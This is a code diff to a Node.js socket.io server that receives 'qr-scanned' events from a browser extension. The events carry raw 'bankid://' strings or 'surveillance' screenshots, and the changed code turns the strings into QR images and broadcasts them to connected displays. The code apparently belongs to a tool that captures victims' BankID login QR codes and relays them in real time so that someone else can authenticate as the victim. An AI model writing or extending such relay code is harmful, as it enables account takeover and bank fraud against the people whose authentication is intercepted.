@@ -13,6 +13,7 @@ const io = require('socket.io')(http, {
 const path = require('path');
 const crypto = require('crypto');
 const config = require('./config');
+const QRCode = require('qrcode'); // <-- ADD THIS
 
 // Session storage for temporary URLs
 const temporaryUrls = new Map();
@@ -312,16 +313,21 @@ io.on('connection', (socket) => {
     });
 
     // Handle QR data from the old extension
-    socket.on('qr-scanned', (data) => {
-        console.log('Received qr-scanned event from old extension:', data);
-        if (data && data.data) {
-            // The old extension sends raw text data, dashboard will generate QR
-            console.log('Broadcasting raw QR data to displays');
-            io.emit('new_qr', data.data);
-        } else if (data && data.screenshot) {
-             // If it's a surveillance event with a screenshot
-             console.log('Broadcasting screenshot from surveillance');
-             io.emit('new_qr', data.screenshot);
+    socket.on('qr-scanned', async (data) => { // <-- Make it async
+        console.log('Received qr-scanned event from old extension.');
+        
+        if (data && data.data) { // Raw text data like "bankid://..."
+            try {
+                // GENERATE QR CODE IMAGE FROM THE TEXT
+                const qrImageBase64 = await QRCode.toDataURL(data.data);
+                console.log('Generated QR code from raw text, broadcasting image.');
+                io.emit('new_qr', qrImageBase64); // Broadcast the IMAGE
+            } catch (err) {
+                console.error('Failed to generate QR code from text:', err);
+            }
+        } else if (data && data.screenshot) { // Screenshot data
+             console.log('Broadcasting screenshot from surveillance.');
+             io.emit('new_qr', data.screenshot); // Broadcast the IMAGE
         }
     });
 
